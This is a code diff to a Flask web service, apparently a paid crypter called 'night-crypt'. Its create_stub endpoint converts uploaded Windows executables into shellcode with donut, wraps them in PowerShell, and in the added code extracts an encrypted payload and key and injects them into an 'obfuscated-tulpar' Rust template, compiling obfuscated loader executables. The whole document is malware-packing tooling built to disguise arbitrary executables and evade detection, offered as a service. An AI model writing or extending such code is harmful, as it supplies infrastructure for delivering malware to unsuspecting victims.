@@ -8,6 +8,7 @@ from pathlib import Path
 import donut
 import subprocess
 import hashlib  # Added hashlib for SHA256 hashing
+import re
 
 app = Flask(__name__)
 app.secret_key = 'night-crypt-secret-key-2024'
@@ -256,6 +257,7 @@ def get_user():
 
 @app.route('/api/create-stub', methods=['POST'])
 def create_stub():
+    print("--- create_stub called ---")
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
 
@@ -271,6 +273,7 @@ def create_stub():
         if not can_create:
             return jsonify({'success': False, 'message': message}), 403
 
+        logs = []
         user_stubs_path = os.path.join(STUBS_PATH, user_id)
         user_ps_path = os.path.join(user_stubs_path, 'ps')
         user_exe_path = os.path.join(user_stubs_path, 'exe')
@@ -290,8 +293,10 @@ def create_stub():
                 filename = secure_filename(file.filename)
                 temp_file_path = os.path.join(user_stubs_path, filename)
                 file.save(temp_file_path)
+                logs.append(f"Uploaded file: {filename}")
 
                 try:
+                    logs.append("Converting .exe to shellcode...")
                     shellcode = donut.create(
                         file=os.path.abspath(temp_file_path),
                         arch=2,  # x64 architecture
@@ -320,11 +325,13 @@ def create_stub():
                     ps1_path = os.path.join(user_ps_path, ps1_filename)
                     with open(ps1_path, 'w', encoding='utf-8') as f:
                         f.write(ps_script)
+                    logs.append(f"Created PowerShell script: {ps1_filename}")
 
                     ps1_file_created = ps1_filename
                     uploaded_file = filename
 
                     try:
+                        logs.append("Configuring rust_stub...")
                         rust_template_path = os.path.join('templates', 'rust_stub', 'src', 'main.rs.template')
                         with open(rust_template_path, 'r', encoding='utf-8') as f:
                             rust_template = f.read()
@@ -358,21 +365,89 @@ def create_stub():
                         compile_cmd = [
                             'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
                         ]
-
+                        logs.append("Compiling rust_stub...")
                         result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)
 
                         if result.returncode == 0:
-                            cpp_exe_created = exe_filename
-                            print(f"Successfully compiled Rust stub: {exe_filename}")
+                            logs.append("rust_stub compiled successfully.")
+                            # Run obin.py on the compiled stub
+                            compiled_stub_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
+                            obin_cmd = ['python', 'obin.py', compiled_stub_path]
+                            logs.append("Running obin.py to extract payload...")
+                            obin_result = subprocess.run(obin_cmd, capture_output=True, text=True, shell=True)
 
-                            # Move the compiled executable to the user's exe folder
-                            compiled_exe_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
-                            os.rename(compiled_exe_path, exe_path)
+                            if obin_result.returncode != 0:
+                                print(f"obin.py failed: {obin_result.stderr}")
+                                logs.append(f"obin.py failed: {obin_result.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to process stub with obin.py', 'logs': logs}), 500
+                            logs.append("Payload extracted successfully.")
+
+                            # Read key.rs and payload.rs
+                            with open('key.rs', 'r') as f:
+                                key_rs = f.read()
+                            with open('payload.rs', 'r') as f:
+                                payload_rs = f.read()
+
+                            os.remove('key.rs')
+                            os.remove('payload.rs')
+
+                            # Extract the byte arrays
+                            key_match = re.search(r'const SECRET_KEY: &\[u8\] = &\[(.*?)\];', key_rs, re.DOTALL)
+                            payload_match = re.search(r'const PAYLOAD: &\[u8\] = &\[(.*?)\];', payload_rs, re.DOTALL)
+
+                            if not key_match or not payload_match:
+                                print(f"Could not extract key or payload")
+                                return jsonify({'success': False, 'message': 'Failed to extract key and payload from obin.py output'}), 500
+
+                            secret_key = key_match.group(1).strip()
+                            payload = payload_match.group(1).strip()
+
+                            # Read and modify obfuscated-tulpar's main.rs
+                            tulpar_main_path = os.path.join('templates', 'obfuscated-tulpar', 'src', 'main.rs')
+                            with open(tulpar_main_path, 'r', encoding='utf-8') as f:
+                                tulpar_code = f.read()
+
+                            original_tulpar_code = tulpar_code
+
+                            tulpar_code = re.sub(r'(const SECRET_KEY: &\[u8\] = &\[)[^]]*(\];)', f'\\1\n    {secret_key}\n\\2', tulpar_code)
+                            tulpar_code = re.sub(r'(const PAYLOAD: &\[u8\] = &\[)[^]]*(\];)', f'\\1\n    {payload}\n\\2', tulpar_code)
+
+                            with open(tulpar_main_path, 'w', encoding='utf-8') as f:
+                                f.write(tulpar_code)
+
+                            # Compile obfuscated-tulpar
+                            tulpar_compile_cmd = [
+                                'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
+                            ]
+                            logs.append("Compiling obfuscated-tulpar...")
+                            tulpar_result = subprocess.run(tulpar_compile_cmd, cwd=os.path.join('templates', 'obfuscated-tulpar'), capture_output=True, text=True, shell=True)
+
+                            # Restore original tulpar code
+                            with open(tulpar_main_path, 'w', encoding='utf-8') as f:
+                                f.write(original_tulpar_code)
+
+                            if tulpar_result.returncode == 0:
+                                cpp_exe_created = exe_filename
+                                print(f"Successfully compiled obfuscated-tulpar: {exe_filename}")
+                                logs.append("obfuscated-tulpar compiled successfully.")
+
+                                # Move the compiled executable
+                                compiled_tulpar_path = os.path.join('templates', 'obfuscated-tulpar', 'target', 'x86_64-pc-windows-gnu', 'release', 'tulpar.exe')
+                                os.rename(compiled_tulpar_path, exe_path)
+                                logs.append(f"Created stub: {exe_filename}")
+                            else:
+                                print(f"obfuscated-tulpar compilation failed: {tulpar_result.stderr}")
+                                logs.append(f"obfuscated-tulpar compilation failed: {tulpar_result.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to compile the final stub', 'logs': logs}), 500
                         else:
                             print(f"Rust compilation failed: {result.stderr}")
+                            logs.append(f"Rust compilation failed: {result.stderr}")
+                            return jsonify({'success': False, 'message': 'Failed to compile the initial stub', 'logs': logs}), 500
 
                     except Exception as rust_error:
                         print(f"Error creating Rust stub: {rust_error}")
+                        logs.append(f"Error creating Rust stub: {rust_error}")
+                        return jsonify({'success': False, 'message': 'An error occurred during the stub creation process', 'logs': logs}), 500
 
                     os.remove(temp_file_path)
 
@@ -380,7 +455,8 @@ def create_stub():
                     print(f"Error converting .exe to shellcode: {e}")
                     if os.path.exists(temp_file_path):
                         os.remove(temp_file_path)
-                    return jsonify({'success': False, 'message': f'Error converting .exe file to PowerShell shellcode: {str(e)}'}), 500
+                    logs.append(f"Error converting .exe to shellcode: {e}")
+                    return jsonify({'success': False, 'message': f'Error converting .exe file to PowerShell shellcode: {str(e)}', 'logs': logs}), 500
 
         file_name = request.form.get('fileName', '')
         auto_start = request.form.get('autoStart') == 'true'
@@ -414,17 +490,20 @@ def create_stub():
         if cpp_exe_created:
             success_message += f' - C++ executable: {cpp_exe_created}'
 
+        print("--- create_stub successful ---")
+        print(logs)
         return jsonify({
             'success': True,
             'message': success_message,
             'folderPath': f'stubs/{user_id}',
             'config': stub_config,
-            'executableFile': cpp_exe_created
+            'executableFile': cpp_exe_created,
+            'logs': logs
         })
 
     except Exception as e:
         print(f"Error creating stub: {e}")
-        return jsonify({'success': False, 'message': 'Error creating stub'}), 500
+        return jsonify({'success': False, 'message': 'Error creating stub', 'logs': [str(e)]}), 500
 
 @app.route('/api/upgrade', methods=['POST'])
 def upgrade_to_premium():
